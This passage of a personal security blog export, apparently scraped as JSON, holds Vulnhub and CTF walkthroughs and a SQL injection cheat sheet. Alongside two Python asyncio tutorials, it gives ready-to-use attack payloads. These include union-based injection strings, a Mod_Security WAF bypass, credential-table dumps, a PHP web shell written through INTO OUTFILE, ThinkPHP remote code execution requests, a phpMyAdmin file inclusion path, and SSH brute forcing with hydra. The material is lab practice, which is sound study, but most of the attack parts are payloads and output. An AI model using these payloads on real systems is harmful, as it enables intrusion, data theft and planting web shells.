7.5.0-3ubuntu1~18.04)) #147-Ubuntu SMP Wed Apr 14 16:10:11 UTMay 28 12:16:41 vuln_cms kernel: Command line: BOOT_IMAGE=/vmlinuz-4.15.0-143-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro maybe-ubiquityMay 28 12:16:41 vuln_cms kernel: KERNEL supported cpus:May 28 12:16:41 vuln_cms kernel: Intel GenuineIntelMay 28 12:16:41 vuln_cms kernel: AMD AuthenticAMDMay 28 12:16:41 vuln_cms kernel: Centaur CentaurHaulsMay 28 12:16:41 vuln_cms kernel: [Firmware Bug]: TSC doesn&#x27;t count with P0 frequency!May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x001: &#x27;x87 floating point registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x002: &#x27;SSE registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x004: &#x27;AVX registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256May 28 12:16:41 vuln_cms kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &#x27;standard&#x27; format.May 28 12:16:41 vuln_cms kernel: e820: BIOS-provided physical RAM map:May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000007fff0000-0x000000007fffffff] ACPI dataMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reservedMay 28 12:16:41 vuln_cms kernel: NX (Execute Disable) protection: activeMay 28 12:16:41 vuln_cms kernel: SMBIOS 2.5 present.May 28 12:16:41 vuln_cms kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006May 28 12:16:41 vuln_cms kernel: Hypervisor detected: KVMMay 28 12:16:41 vuln_cms kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; reservedMay 28 12:16:41 vuln_cms kernel: e820: remove [mem 0x000a0000-0x000fffff] usableMay 28 12:16:41 vuln_cms kernel: e820: last_pfn = 0x7fff0 max_arch_pfn = 0x400000000May 28 12:16:41 vuln_cms kernel: MTRR default type: uncachableMay 28 12:16:41 vuln_cms kernel: MTRR variable ranges disabled:May 28 12:16:41 vuln_cms kernel: MTRR: DisabledMay 28 12:16:41 vuln_cms kernel: x86/PAT: MTRRs disabled, skipping PAT initialization too.May 28 12:16:41 vuln_cms kernel: CPU MTRRs all blank - virtualized system.May 28 12:16:41 vuln_cms kernel: x86/PAT: Configuration [0-7]: WB WT UC- UC WB WT UC- UC May 28 12:16:41 vuln_cms kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff]May 28 12:16:41 vuln_cms kernel: Scanning 1 areas for low memory corruptionMay 28 12:16:41 vuln_cms kernel: RAMDISK: [mem 0x30ec5000-0x34759fff]May 28 12:16:41 vuln_cms kernel: ACPI: Early table checksum verification disabledMay 28 12:16:41 vuln_cms kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX )May 28 12:16:41 vuln_cms kernel: ACPI: XSDT 0x000000007FFF0030 00003C (v01 VBOX VBOXXSDT 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: FACP 0x000000007FFF00F0 0000F4 (v04 VBOX VBOXFACP 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: DSDT 0x000000007FFF0470 002325 (v02 VBOX VBOXBIOS 00000002 INTL 20100528)May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040!/bin/sh# iduid=0(root) gid=0(root) groups=0(root) 程序运行后，输入!/bin/sh可提升至root权限读取flag 123456789101112# cd /home/ # lselliot ghost tyrell# cd elliot# cat user.txt9046628504775551# cd /root/# lsroot.txt# cat root.txt4359537020406305# done","categories":[],"tags":[],"author":"Dokey_"},{"title":"Vulnhub-Hackathon2","slug":"Vulnhub-Hackathon2","date":"2021-07-24T06:06:59.000Z","updated":"2023-03-25T14:35:06.442Z","comments":true,"path":"16564.html","link":"","permalink":"http://example.com/16564.html","excerpt":"","text":"记录打靶机（Hackathon2）的过程信息探测主机发现这里使用的是arp-scan进行扫描，因为在使用netdiscover无法成功探测到网段下存活主机，不知道是不是命令使用不正确，后续研究一下。。。 123456789101112sudo arp-scan 192.168.109.1/24 Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140WARNING: host part of 192.168.109.1/24 is non-zeroStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.144 00:0c:29:28:21:61 VMware, Inc.192.168.109.254 00:50:56:f2:84:70 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.934 seconds (132.37 hosts/sec). 4 responded 经arp-scan探测后发现存在192.168.109.144这个IP地址，对此IP地址进行端口扫描，一般会存在80端口 端口扫描 1234567891011121314151617181920212223242526272829303132333435363738nmap -sC -sV -p- 192.168.109.144 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:33 EDTNmap scan report for 192.168.109.144Host is up (0.00020s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt|_-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.109.140| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_*/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: hackathon27223/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)| 256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)|_ 256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds nmap扫描后发现存在21（ftp）、80（Apache-httpd）、7223（ssh）三个端口，针对这三个端口有必要进行以下信息收集： ftp（21）端口： 尝试匿名用户登录（anonymous&#x2F;anonymous）✔ 在漏洞数据库搜索相关ftp（vsftpd 3.0.3）版本漏洞 ✗ http（80）端口： 可进行目录扫描，爆破出隐藏的目录以及页面 ✔ 查看已发现页面的源码，对index.html源码进行查看，无有用信息，因为是靶机，通常页面或者隐藏页面中源码会有一些有用的信息 ✔ ssh（7223）端口 在漏洞数据库搜索相关ssh（OpenSSH 8.2p1）版本漏洞 ✗ 使用hydra进行爆破，此处需收集用户名、密码 ✔ 使用anonymous&#x2F;anonymous登录ftp 12345678910111213141516ftp&gt; open 192.168.109.144Connected to 192.168.109.144.220 (vsFTPd 3.0.3)Name (192.168.109.144:kali): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir226 Directory send OK.ftp&gt; 匿名登录成功后可以看到flag1.txt和word.dir两个文件，猜测word.dir为一个字典文件，看了内容大概率是一个密码字典文件，如果使用其来爆破ssh用户名密码的话，此处还需要用户名， 因为本次靶机使用的ssh版本不存在用户名枚举漏洞，故猜测在80端口页面上可能存在用户名。 进行目录扫描这里有点问题：在使用dirb进行目录扫描时会发现除了几个通用的页面之外无其他有用信息Tips：可以使用word.dic为字典文件进行目录扫描 123456789101112131415161718192021dirb http://192.168.109.144/ word.dir -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 24 01:52:28 2021URL_BASE: http://192.168.109.144/WORDLIST_FILES: word.dir-----------------GENERATED WORDS: 109 ---- Scanning URL: http://192.168.109.144/ ----+ http://192.168.109.144/happy (CODE:200|SIZE:110) -----------------END_TIME: Sat Jul 24 01:52:28 2021DOWNLOADED: 109 - FOUND: 1 经扫描后发现存在happy页面，访问后在源码上可发现暴露了一个用户名 爆破ssh整理一下信息，现在在80端口下的happy页面发现用户名，在ftp上发现word.dic字典文件，可以尝试爆破ssh，进一步获取权限 12345678910111213hydra -l hackathonll -P word.dir -f -t 20 ssh://192.168.109.144 -s 7223 Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-24 00:16:41[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 20 tasks per 1 server, overall 20 tasks, 110 login tries (l:1/p:110), ~6 tries per task[DATA] attacking ssh://192.168.109.144:7223/[7223][ssh] host: 192.168.109.144 login: hackathonll password: Ti@gO[STATUS] attack finished for 192.168.109.144 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-24 00:16:58 hydra已经爆破出密码：Ti@gO 连接ssh使用已爆破的用户名、密码进行ssh连接至靶机 1234567891011121314151617181920212223242526272829ssh hackathonll@192.168.109.144 -p 7223 hackathonll@192.168.109.144&#x27;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 24 Jul 2021 07:38:22 AM UTC System load: 0.01 Processes: 221 Usage of /: 24.2% of 18.57GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 192.168.109.144 Swap usage: 0%67 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sat Jul 24 04:18:07 2021 from 192.168.109.140$ iduid=1001(hackathonll) gid=1001(hackathonll) groups=1001(hackathonll)$ 连接成功，但是此时的用户为hackathonll，因此需要进行提权 提权使用sudo -l查看是否可使用sudo进行提权，发现vim可以不验证密码具备root权限 12345678sudo -lMatching Defaults entries for hackathonll on hackathon: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hackathonll may run the following commands on hackathon: (root) NOPASSWD: /usr/bin/vim 上网查过后发现可直接使用vim进行提权，进入vim编辑界面时输入!bash可直接获取root权限可参考：https://blog.csdn.net/qq_39991837/article/details/118119954 1234567891011sudo vimroot@hackathon:/home/hackathonll# iduid=0(root) gid=0(root) groups=0(root)root@hackathon:/home/hackathonll# lsroot@hackathon:/home/hackathonll# cdroot@hackathon:~# lsflag2.txt snaproot@hackathon:~# cat flag2.txt ₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;root@hackathon:~# 至此，Hackathon2靶机渗透完成。。。done","categories":[],"tags":[],"author":"Dokey_"},{"title":"zixem SQL challenges","slug":"zixem-challenges","date":"2021-07-22T08:43:09.000Z","updated":"2023-03-25T14:35:06.472Z","comments":true,"path":"19459.html","link":"","permalink":"http://example.com/19459.html","excerpt":"","text":"Level 1简单的一关，常规的联合查询注入(数字型)。 ?id=1 and 1=2 union select 1,concat(user(),version),3--+ Level 2同Level 1简单，字符型注入，闭合单引号即可。 ?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+ Level 3常规字符型注入，使用--+闭合单引号号即可，在使用union进行注入时，union会变成uni，此时需要使用unionon。 ?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+ Level 4同Level 3，字符型注入，闭合单引号，注入语句无法使用-使其报错，可使用and 1=2。 ?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+ Level 5需要爆破，待… Level 6 and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)-- Level 7这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的value。 图中value的值就是注入点，后面都是常规注入操作 ?id=1 AND 1=2 UNION SELECT 1,user(),3--+ Level 8这一关会对%20进行过滤（初步判断）以及会对select进行检测，双写可绕过，数字型注入，可使用%09、%0d进行绕过，后面就是常规的注入操作。 ?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09- Level 9这一关需要读取/etc/passwd文件，经测试知道load_file()被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误： 根据报错提示可以在1处进行读取 ?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- - Level 10这一关x为注入点，但是参数是经过编码的，刚开始以为是base64 encode + url encode,解码后发现并没有那么简单，经过看别人的blog后了解到是uuencode，解码后参数显示为1。将SQL注入语句经过编码后可正常执行。 将SQL注入语句编码后即可 1234567891011121 and 1=2 union select 1,concat(user(),version())-- -经过uuencode加密后得到M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO(;B@I*2TM(&quot;T``再使用base64进行编码得到TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=最后使用url编码得到最终payloadTSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D done 参考链接 https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4","categories":[],"tags":[],"author":"Dokey_"},{"title":"Bypass Mod_Security","slug":"Bypass-Mod-Security","date":"2021-07-21T07:45:17.000Z","updated":"2023-03-25T14:35:06.415Z","comments":true,"path":"14163.html","link":"","permalink":"http://example.com/14163.html","excerpt":"","text":"记bypass Mod_Security起因Google上搜索相关SQL注入，在测试中发现使用联合查询注入时会报错 `Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.`， 使用order by 猜解显示位时不会报错 经过懒得fuzz，直接Google搜索了相关bypass文章，文章中详细介绍了fuzz过程，直接修改payload 进行注入。 结果结果当然是ok的了，成功注出数据库名和版本信息，后面操作大同小异，溜溜球！ payload 1/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2,3,4,5,6,7)--+ done 参考链接：https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad","categories":[],"tags":[],"author":"Dokey_"},{"title":"MYSQL备忘录","slug":"SQL备忘录","date":"2021-07-21T02:30:26.000Z","updated":"2023-03-25T14:35:06.435Z","comments":true,"path":"22293.html","link":"","permalink":"http://example.com/22293.html","excerpt":"","text":"列出可用的数据库 SHOW DATABASE; 切换到数据库 USE table_name 表 添加新表 CREATE TABLE logins (id INT, ...) 列出当前数据库中的可用表 SHOW TABLES; 显示表属性和列 DESCRIBE logins 将值添加到表 INSERT INTO table_name VALUES (value_1,...) 将值添加到表中的特定列 INSERT INTO table_name(colums2,...) VALUES(column2_value, ...) 更新表值 UPDATE table_name SET column1=newvalue1,...WHERE &lt;CONDITION&gt; 列 显示表格中的所有列 SELECT * FROM table_name 显示表格中的特定列 SELECT column1, column2 FROM table_name 删除表 DROP TABLE logins 添加新列 ALTER TABLE logins ADD newColumn INT 重命名列 ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn 更改列数据类型 ALTER TABLE logins MODIFY oldColumn DATE 删除列 ALTER TABLE logins DROP oldColumn 输出 按列排序 SELECT * FROM logins ORDER BY column_1 按列降序排序 SELECT * FROM logins ORDER BY column_1 DESC 按两列排序 SELECT * FROM logins ORDER BY column_1 DESC, id ASC 只显示前两个结果 SELECT * FROM logins LIMIT 2 只显示从索引2开始的前两个结果 SELECT * FROM logins LIMIT 1,2 列出满足条件的结果 SELECT * FROM table_name WHERE &lt;condition&gt; 列出名称与给定字符串相似的结果 SELECT * FROM logins WHERE username LIKE &#39;admin%&#39; MySQL运算符优先级 除法(&#x2F;)、乘法（*）和模数（%） 加法（+）和减法（-） 比较（&#x3D;,&gt;,&lt;,&lt;&#x3D;,&gt;&#x3D;,!&#x3D;,LIKE） 不是（！） 与（&amp;&amp;） 或（||） Payload身份验证绕过 基本身份认证绕过 admin&#39; or &#39;1&#39;=&#39;1 带注释的基本身份验证绕过 admin&#39;)-- - union injection 使用检测列数 order by &#39; order by 1-- - 使用联合注入检测列数 cn&#39; UNION select 1,2,3-- - 基本联合注入 cn&#39; UNION select 1,@@version,3,4-- - 4列联合注入 UNION select username, 2, 3, 4 from passwords-- - 数据库枚举 带查询输出的指纹 MySQL SELECT @@version 没有输出的指纹 MySQL SELECT SLEEP(5) 当前数据库名称 cn&#39; UNION select 1,database(),2,3-- - 列出所有数据库 cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 列出特定数据库中的所有表 cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- - 列出特定表中的所有列 cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- - 从另一个数据库中的表转储数据 cn&#39; UNION select 1, username, password, 4 from dev.credentials-- - 特权 查找当前用户 cn&#39; UNION SELECT 1,user(),3,4-- - 查找用户是否具有管理员权限 cn&#39; UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=&quot;root&quot;-- - 查找是否所有用户权限 cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- - 查找可以通过 MySQL 访问的目录 cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- - 文件注入 读取本地文件 cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- - 将字符串写入本地文件 select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39; 将 web shell 写入基本 web 目录 cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulhub","slug":"vulhub","date":"2021-07-19T07:08:58.000Z","updated":"2023-03-25T14:35:06.467Z","comments":true,"path":"26813.html","link":"","permalink":"http://example.com/26813.html","excerpt":"","text":"vulhubThinkPHP 2.x 任意代码执行漏洞1访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo() Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability1234567891011POST /index.php?s=captcha HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability1http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)1http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-02","slug":"异步协程-02","date":"2021-07-01T11:14:26.000Z","updated":"2023-03-25T14:35:06.476Z","comments":true,"path":"60636.html","link":"","permalink":"http://example.com/60636.html","excerpt":"","text":"异步编程事件循环死循环，检测代码并执行某些代码 1234567891011任务列表 = [任务1，任务2，任务3...]while True: 可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有的任务，将&quot;可执行&quot;和&quot;已完成&quot;的任务返回 for 就绪任务 in 可执行的任务列表： 执行已就绪的任务 for 已完成的任务 in 已完成的任务列表： 再任务列表中移除 已完成任务 如果任务列表中的任务都已完成，则终止循环 快速上手协程函数，定义函数为async def 函数名协程对象，执行 协程函数() 得到的协程对象 123456import asyncioasync def func(): passresult = func() 注意：执行协程函数创建协程对象，函数内部代码不会执行如果想要运行协程函数内部代码，必须要将协程对象交给事件循环来处理 1234567891011import asyncioasync def func(): print(&quot;test&quot;) result = func()loop = asyncio.get_event_loop()loop.run_until_complete(result)# asyncio.run(result ) await关键字await + 可等待对象（协程对象、Future、Task对象）-&gt; IO等待一个协程函数中可以存在多个await示例： 1234567891011121314import asyncioasync def others(): print(&quot;start&quot;) await asyncio.sleep(2) print(&quot;end&quot;) return &quot;返回值&quot;async def func(): print(&quot;执行协程函数内部代码&quot;) response = await others() print(&quot;IO请求结束， 结果为：&quot; + response)asyncio.run(func()) 输出结果 12345执行协程函数内部代码start----------停顿end IO请求结束，结果为： 返回值 task对象Tasks用于并发调度协程，通过asyncio.create_task(协程对象)的方式创建Tak对象，这样可以让协程加入事件循环中等待被调度执行。除了使用asyncio.create_task()函数以外，还可以用低层级的loop.create_task()或ensure_future()函数，不建议手动实例化Task对象。 示例1 12345678910111213141516171819202122232425import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task1 = asyncio.create_task(func()) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task2 = asyncio.create_task(func()) print(&quot;main 结束&quot;) # 当执行某协程遇到IO操作时，会自动化切换执行其他任务 # 此处的await是等待相应的协程全都执行完毕并获取结果 ret1 = await task1 ret2 = await task2 asyncio.run(main()) 输出结果 12345678main 开始main 结束11---------sleep(2秒)22返回值 返回值 示例2 12345678910111213141516171819202122import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) task_list = [ asyncio.create_task(func(), name=&quot;task1&quot;) asyncio.create_task(func(), name=&quot;task2&quot;) ] print(&quot;main 结束&quot;) done, pending = await asyncio.wait(task_list) print(done) asyncio.run(main()) 输出结果 12345678main 开始main 结束11--------sleep(2秒)22&#123;&lt;Task finished name=&#x27;task1&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;, &lt;Task finished name=&#x27;task2&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;&#125; async Future对象Task对象继承Future，Task对象内部await结果的处理基于Future对象来的 concurrent.futures.Future对象使用线程池、进程池实现异步操作时用到的对象 异步迭代器略 异步上下文管理器此种对象通过定义__aenter__()和__aexit__()方法来对async_with语句中的环境进行控制 12345678910111213141516171819202122import asyncioclass AsyncContextManager: def __init__(self): self.conn = conn async def do_something(self): # 异步操作数据库 return 666 async def __aenter__(self): # 异步连接数据库 self.conn = await asyncio.sleep(2) return self async def __aexit__(self, exc_type, exc, tb): await asyncio.sleep(2)async def func(): async with AsyncContextManager as f: result = await f.do_something() print(result) asyncio.run(func())","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-01","slug":"异步协程-01","date":"2021-06-30T11:13:20.000Z","updated":"2023-03-25T14:35:06.473Z","comments":true,"path":"60828.html","link":"","permalink":"http://example.com/60828.html","excerpt":"","text":"异步协程-class01 协程 asyncio模块进行异步编程 实战案例 1.协程协程不是计算机提供，程序员人为创造。协程（Coroutine），也可以被称为微线程，是一种用户态内的上下文切换的技术，简而言之，其实就是通过一个线程实现代码块相互切换执行。 实现协程的方法: greenlet, 早期模块 yield关键字 asyncio装饰器（py3.4引入） async、await关键字（py3.5）【推荐】 1.1 greenlet实现协程123456789101112131415161718from greenlet import greenletdef func1(): print(1) # 第二步：输出1 gr2.switch() # 第三步：切换到func2 print(2) # 第六步：输出2 gr2.switch() # 第七步：切换到func2 def func2(): print(3) # 第四步：输出3 gr1.switch() # 第五步：切换到func1 print(4) # 第八步：输出4 gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第一步：切换到func1 输出结果 12341324 1.2 yield关键字1234567891011121314def func1(): yield 1 yield from func2() yield 2def func2(): yield 3 yield 4f1 = func1()for item in f1: print(item) 输出结果 12341342 1.3 async、await关键字12345678910111213141516171819import asyncioasync def func1(): print(1) await asyncio.sleep(2) print(2) async def func2(): print(3) await asyncio.sleep(2) print(4) tasks = [ asyncio.ensure_future(func1()), asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) __注意：遇到IO阻塞自动切换输出结果 1234513--------停顿24 协程的意义在线程中如果遇到IO等待时间，线程可利用空闲时间干其他的事情 2.1 案例：下载三张图片 普通方式12345678910111213141516171819202122import requestimport timedef download(url): name = url.rsplit(&quot;/&quot;, 1)[1] res = requests.get(url) with open(name, mode=&quot;wb&quot;) as f: f.write(res.content) print(name + &quot;Finish.&quot;)if &quot;__name__&quot; == &quot;__main__&quot;: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] start = time.time() for i in url_list: download(i) stop = time.time() print(stop - start) 协程方式1234567891011121314151617181920212223242526272829import asyncioimport aiohttpimport timeasync def download(session, url): async with session.get(url) as response: content = response.content.read() file_name = url.rsplit(&quot;/&quot;, 1)[1] with open(file_name, mode=&quot;wb&quot;) as f: f.write(content) print(file_name + &quot; &quot; +&quot;done&quot;)async def main(): async with aiohttp.ClientSession as session: url_list = [ &quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;, &quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;, &quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;] taaks = [asyncio.creat_task(download(session, url)) for url in url_list] await async.wait(tasks)if &quot;__name__&quot; == &quot;__main__&quot;: start = time.time() loop = asyncio.get_event_loop() loop.run_until_complete(main()) stop = time.time() print(stop - start) done","categories":[],"tags":[],"author":"Dokey_"},{"title":"Sqli Labs-01","slug":"Sqli-Labs-01","date":"2021-03-03T02:38:49.000Z","updated":"2023-03-25T14:35:06.440Z","comments":true,"path":"5706.html","link":"","permalink":"http://example.com/5706.html","excerpt":"","text":"基础知识SQL注入分类基于从服务器接收到的响应 基于错误SQL注入 联合查询的类型 堆查询注射 SQL盲注 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于如何处理输入的SQL查询（数据类型） 基于字符串 数字或整数为基础的 基于程度和顺序的注入（哪里发生了影响） 一阶注入 二阶注入一阶注入是指输入的输入语句对WEB直接产生了影响，出现了结果；二阶注入是指输入提交的语句无法直接对WEB应用程序产生影响，通过对其他的辅助间接对WEB产生危害。 系统函数 version() – MySQL版本 user() – 数据库用户名 database() – 数据库名 @@datadir – 数据库路径 @@version_compile_os – 操作系统版本 字符连接函数 concat(str1,str2,…) – 没有分隔符的连接字符串 concat_ws(separator,str1,str2,…) – 含有分隔符地连接字符串 group_concat(str1,str2,…) – 连接一个组的所有字符串，并以逗号分隔每一条数据三个函数能一次性查出所有信息 一般用于尝试的语句PS: –+可以用#替换，url提交过程中编码后为%23 1234567or 1=1--+&#x27;or 1=1--+&quot;or 1=1--+)or 1=1--+&#x27;)or 1=1--+&quot;)or 1=1--+))or 1=1--+ 一般代码为： 12$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM users WHERE id = 